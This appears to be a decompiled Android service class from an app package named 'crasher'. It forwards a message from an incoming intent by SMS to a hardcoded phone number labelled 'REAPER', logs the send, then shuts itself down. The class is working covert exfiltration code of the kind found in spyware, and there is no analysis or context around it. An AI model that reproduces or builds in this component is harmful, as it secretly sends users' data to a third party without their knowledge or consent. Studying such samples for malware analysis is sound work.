package com.bigeye.crasher;

import android.app.IntentService;
import android.content.Intent;
import android.telephony.SmsManager;
import android.util.Log;
/* loaded from: classes.dex */
public class Send2ReaperService extends IntentService {
    public String OPERATION = "";
    public String MSG = "";
    public String REAPER = "+254710416905";
    public String APP_TAG = "Send2ReaperService";

    public Send2ReaperService() {
        super("SendSMSToReaper");
    }

    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent) {
        this.OPERATION = intent.getStringExtra("OPERATION");
        this.MSG = intent.getStringExtra("MSG");
        Send2Reaper();
        Log.i(this.APP_TAG, "All Texts sent! committing suicide");
        stopSelf();
    }

    public void Send2Reaper() {
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(this.REAPER, null, this.MSG, null, null);
        Log.i(this.APP_TAG, "Sending Text: " + this.MSG);
    }
}
